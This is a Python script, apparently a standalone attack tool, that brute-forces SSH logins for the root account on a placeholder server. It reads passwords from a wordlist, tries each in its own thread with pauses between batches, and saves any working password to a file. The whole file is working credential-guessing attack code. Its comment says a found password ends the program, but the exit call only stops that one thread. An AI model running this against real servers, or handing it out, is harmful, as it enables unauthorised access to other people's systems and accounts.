import paramiko
import threading
import time
import sys

hostname = "Server_IP"
port = 22 #server port. Usually 22.
username = "root"
passwords = []

# read passwords from file
with open("wordlist.txt") as f:
    passwords = f.read().splitlines()

found = None  # initialize found variable to None

# define a function to try a password
def try_password(password):
    global found  # use global variable found inside function
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname, port=port, username=username, password=password)
        print(f"[+] Password found: {password}")
        found = password  # assign password to found variable
        with open("found.txt", "w") as f:
            f.write(found)
            print(f"[+] Password written to found.txt: {found}")
        sys.exit()  # terminate program
    except paramiko.AuthenticationException:
        print(f"[-] Incorrect password: {password}")
    except Exception as e:
        print(f"[!] Error occurred while connecting: {e}")
    finally:
        client.close()

# create threads to try passwords
threads = []
for i, password in enumerate(passwords):
    # create a thread to try the password
    thread = threading.Thread(target=try_password, args=(password,))
    threads.append(thread)

    # start the thread
    thread.start()

    # wait for every 10 tries
    if (i+1) % 10 == 0:
        print("[*] Waiting for 4 seconds...")
        time.sleep(4)

# wait for all threads to finish
for thread in threads:
    while thread.is_alive():  # wait until thread finishes
        time.sleep(0.2)

if not found:  # if password not found
    print("[-] Password not found.")

